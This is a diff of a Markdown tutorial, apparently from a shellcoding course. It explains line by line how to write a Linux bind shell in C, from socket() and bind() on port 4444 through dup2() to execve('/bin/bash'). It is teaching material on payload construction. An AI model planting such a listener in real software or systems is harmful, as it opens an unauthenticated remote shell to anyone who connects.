@@ -69,24 +69,28 @@ int main(void)
 ```  
 Great, now lets take a deeper dive into how to find all these function, and what they mean, using the linux man (manual) pages.   
 
-Our first function is `socket(). We already know that this function is used to create a new socket. To find out more about this function we will use the command `man 7 socket` from our linux terminal.  
+###socket()
+Our first function is `socket()`. We already know that this function is used to create a new socket. To find out more about this function we will use the command `man 7 socket` from our linux terminal.  
 ```console
 man 7 socket
   int socket(int domain, int type, int protocol);
 ```
 Our requirements for our bind shell is that at Layer 3 it uses the IP version 4 Protocol and that at Layer 4 it uses the Transmission Control Protocol (TCP).  
 Reviewing the socket() man pages we discover we will need the following values/variables for our function:  
-+ int domain   = AF_INET          // IPv4 Internet protocols.
-+ int type     = SOCK_STREAM      // Provides sequenced, reliable, two-way, connection-based byte streams (TCP).
-+ int protocol = 0                // The protocol to be used with the socket. Normally there is only one protocol per socket type. In this case the protocol value is 0.
++ `int domain`   = `AF_INET`
+  - IPv4 Internet protocols.
++ `int type`     = `SOCK_STREAM`      // 
+  - Provides sequenced, reliable, two-way, connection-based byte streams (TCP).
++ `int protocol` = `0`                // 
+  - The protocol to be used with the socket. Normally there is only one protocol per socket type. In this case the protocol value is 0.
 
 Our C socket function will therefor be:  
         `int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);`
 
-
-Now that our socket IPv4, TCP Socket has been created we will need to create an Address for it, and bind the Address to the Socket.  
-To create the IP Socket Address (IP + TCP Port Number), we will dig into it's man pages "man 7 ip".  
-We find this relevant information.
+### bind()
+Now that our IPv4-TCP Socket has been created, we will need to create an Address for it. Then bind the Address to the Socket.  
+To create the IP Socket Address (IP + TCP Port Number), we will dig into it's man pages `man 7 ip`.  
+We find this relevant information:
 ```c
 An IP socket address is defined as a combination of an IP interface address and a 16-bit port number.
 struct sockaddr_in {
@@ -102,8 +106,8 @@ struct in_addr {
 From the above information, we know that we will need to use the Address Family `AF_INET`, then give it a port number (we will use TCP port 4444), and finally we will bind it to any/all interfaces using `INADDR_ANY`.  
 The struct we will use is:  
         `struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) };`  
-+ "man htons" The htons() function converts an unsigned short integer hostshort from host byte order to network byte order.
-+ "man htonl" - The htonl() function converts the unsigned integer hostlong from host byte order to network byte order.
++ `man htons` - The `htons()` function converts an unsigned short integer hostshort from host byte order to network byte order.
++ `man htonl` - The `htonl()` function converts the unsigned integer hostlong from host byte order to network byte order.
 
 Now that we have a socket, a TCP port, and an IPv4 interface, we need to `bind` them all together.  
 we will use the `bind()` C function to accomplish this, and dive into the man pages to discover the values/variables we will need, with the command `man 2 bind`.  
@@ -113,34 +117,51 @@ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 The first argument is `sockfd`, the socket file descriptor is the variable `ipv4Socket` we created earlier when creating the socket.  
 The second argument `struct sockaddr \*addr`, is a pointer to the IPv4-TCP Socket address we created earlier `ipSocketAddr`.  
 The final arguement is simply the byte length of our `ipSocketAddr` struct. We will fufill this using the C `sizeof()` function to do the work for us.  
-Our bind function will be:  
-       ` bind(ipv4Socket, (struct sockaddr\*) &ipSocketAddr, sizeof(ipSocketAddr));`
-Now that we have created a Socket and given it an address, we will need to configure it to be in the listening state, so it can listen for incoming connections.  
-+ Listen for incoming TCP connects on port 4444 - see "man 2 listen" for full details.
+Our bind function will be:   
+       `bind(ipv4Socket, (struct sockaddr\*) &ipSocketAddr, sizeof(ipSocketAddr));`   
+
+### listen()
+Now that we have bound an address to our socket, we will need to configure it to be in the listening state. Allowing the socket to listen for incoming connections.   
+To learn what we need to do we consult the manual page with `man 2 listen`.   
+We find that the `listen()` function requires two arguments.  
 `int listen(int sockfd, int backlog);`   
-From the man pages we can see that the two arguements needed are `sockfd` and `backlog`.    
 + `sockfd` is simply our `ipv4Socket` variable. 
-+ `backlog` is for handling multiple connections. We only need to handle one connection at a time, therefor we will set this value to `0`.  
-Our C function will be:  
++ `backlog` is for handling multiple connections. 
+  - We only need to handle one connection at a time, therefor we will set this value to `0`.   
+Our C function will be:   
         `listen(ipv4Socket, 0);`  
-Once 
-        // Accept incoming connection - see "man 2 accept" for full details.
-        //  the accept function takes the connection request from the listen function and creates a new connected socket.
-        //      int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-        int clientSocket = accept(ipv4Socket, NULL, NULL);
 
-        // Duplicate the File Descriptors for Standard Input(0), Standard Output(1), and Stadard Error(2) to the newly created, connected Socket. See "man 2 dup2" for full details.
-        //  int dup2(int oldfd, int newfd);
-        dup2(clientSocket, 0);
-        dup2(clientSocket, 1);
-        dup2(clientSocket, 2);
+### accept()
+Now that our socket is listening we need to accept the incoming connections with the C function `accept()`.  
+Consulting the manual page with `man 2 accept` we find that:  
++ the accept function takes the connection request from the listen function and creates a new connected socket.
++ `int accept(int sockfd, struct sockaddr \*addr, socklen_t \*addrlen);`
+We will give our `accept()` function the variable name `clientSocket`. We will use our `ipv4Socket` variable we created earlier to fulfill the `int sockfd` arguments, and set the remaining two arguments to `NULL`.  
+Our C function will be:   
+        `int clientSocket = accept(ipv4Socket, NULL, NULL);`
 
-        // In the newly created socket, execute a shell. - See "man 2 execve" for full details.
-        //  int execve(const char *filename, char *const argv[], char *const envp[]);
-        execve("/bin/bash", NULL, NULL);
+### dup2()
+Now that we have a tcp socket listening and accepting incoming connections, we will need to pass the input, output, and error messages from the program, to the connecting client. This will allow the connecting client to input text using their keyboard, and read the output that is returned.  
+We will duplicate the File Descriptors for Standard Input(0), Standard Output(1), and Stadard Error(2) to the newly created, connected socket using the dup2() function three times. We will consult the man pages for more information will `man 2 dup2`.   
+	`int dup2(int oldfd, int newfd);`
+We find that the `dup2()` function requires 2 arguements. The first arguement `int oldfd` we be fufilled using the `clientSocket` variable we created earlier. The second arguement `int newfd` will be fufilled using the number value for STDIN(0), STDOUT(1), and STDERR(2) respectively.  
+Our three dup2 functions will be:  
+        `dup2(clientSocket, 0);`  
+        `dup2(clientSocket, 1);`  
+        `dup2(clientSocket, 2);`  
+
+### execve()
+At this point we have our program listening, and accepting connections from incoming clients. Once the client connects, the input and output of our program is passed over to the connecting client. The last thing we need to do is execute a program for our client to interact with.  
+We will use the C function `execve()` to execute the shell `/bin/bash`.  
+Consulting the manual pages with `man 2 execve` we find:  
+```c
+int execve(const char *filename, char *const argv[], char *const envp[]);
+```
+We discover that since we are not passing any additional options/flags/enviorment-settings to our `/bin/bash` program, we may set the arguments `argv[]` and `envp[]` to `NULL`. The first arguement `*filename` requires we give it the full path to our program `/bin/bash`.  
+Our C function will be:  
+       ` execve("/bin/bash", NULL, NULL);`
 
 }
-
 
 ## Mapping System Calls to C Functions
 
